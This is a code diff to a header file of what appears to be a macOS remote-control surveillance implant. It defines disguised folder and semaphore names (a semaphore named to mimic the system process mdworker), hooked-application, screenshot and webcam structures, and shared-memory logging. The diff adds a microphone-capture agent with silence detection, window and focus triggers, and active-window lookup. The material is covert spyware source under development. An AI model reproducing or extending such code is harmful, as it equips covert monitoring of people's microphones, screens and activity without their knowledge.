@@ -26,10 +26,6 @@
 #import "RCSMSharedMemory.h"
 #import "RCSMUtils.h"
 
-//#define DEMO_VERSION
-//#define DEV_MODE
-//#define DEBUG_LOG
-
 #define INPUT_MANAGER_FOLDER @"appleHID"
 #define OSAX_FOLDER @"appleOsax"
 #define ME __func__
@@ -145,8 +141,13 @@ typedef struct os_version {
 // Size of the first 2 DWORDs that we need to skip in the configuration file
 #define TIMESTAMP_SIZE sizeof(int) * 2
 
-#define SHMEM_COMMAND_MAX_SIZE  0x3000
-#define SHMEM_LOG_MAX_SIZE      0x300000
+extern int32_t gMemCommandMaxSize;
+extern int32_t gMemLogMaxSize;
+
+//#define SHMEM_COMMAND_MAX_SIZE  0x3000
+//#define SHMEM_LOG_MAX_SIZE      0x302460
+
+//#define SHMEM_LOG_MAX_SIZE    0x300000
 #define SHMEM_SEM_NAME          @"sem-mdworker"
 
 // Hooked external apps Identifier
@@ -370,7 +371,11 @@ typedef struct _timer {
 
 typedef struct _process {
   u_int onClose;
-  u_int lookForTitle; // 1 for Title - 0 for Process Name
+  u_int lookForTitle;
+  // First bit = 1 Window, 0 Process; Second bit = 1 Focus
+#define EVENT_PROCESS_ON_PROC   0x00000000
+#define EVENT_PROCESS_ON_WINDOW 0x00000001
+#define EVENT_PROCESS_ON_FOCUS  0x00000002
   char name[256];
 } processStruct;
 
@@ -435,6 +440,11 @@ typedef struct _screenshot {
   u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
   u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
 } screenshotStruct;
+
+typedef struct _microphone {
+  u_int detectSilence;
+  u_int silenceThreshold;
+} microphoneAgentStruct;
 
 // Massimo Chiodini - 05/08/2009
 typedef struct _webcam {
@@ -602,6 +612,14 @@ enum contactType {
   Anniversary               = 0x32
 };
 
+typedef struct _microphoneHeader {
+  u_int version;
+#define LOG_MICROPHONE_VERSION 2008121901
+  u_int sampleRate;
+  u_int hiTimestamp;
+  u_int loTimestamp;
+} microphoneAdditionalStruct;
+
 #pragma pack(2)
 
 typedef struct _waveFormat
@@ -641,7 +659,10 @@ typedef struct _shMemoryCommand {
   u_int commandDataSize;
 } shMemoryCommand;
 
-// size: 0x2710 - 10K
+//
+// size: 0x2720 - 10016
+// OLD!!!! size: 0x2710 - 10K
+//
 typedef struct _shMemoryLog {
   u_int status;                       // 0 - free | 1 - Is Writing | 2 - Written
 #define SHMEM_FREE                0x0
@@ -751,6 +772,8 @@ void printFormatFlags(AudioStreamBasicDescription inDescription);
 #endif
 
 size_t _utf16len(unichar *string);
+
+NSDictionary *getActiveWindowInfo();
 
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
